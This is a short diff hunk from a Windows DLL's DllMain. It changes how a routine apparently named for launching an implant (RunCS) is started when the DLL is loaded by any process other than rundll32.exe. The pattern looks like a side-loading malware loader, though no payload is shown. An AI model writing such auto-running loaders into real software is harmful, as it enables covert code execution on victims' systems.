@@ -79,7 +79,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 			GetModuleFileNameA(hExecutable, ModuleFilename, sizeof(ModuleFilename));
 			if (StrStrIA(ModuleFilename, "rundll32.exe") == NULL )
 			{ 
-				CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)RunCS, hModule, 0, nullptr); 
+				RunCS(); 
 			}
 
 			break;
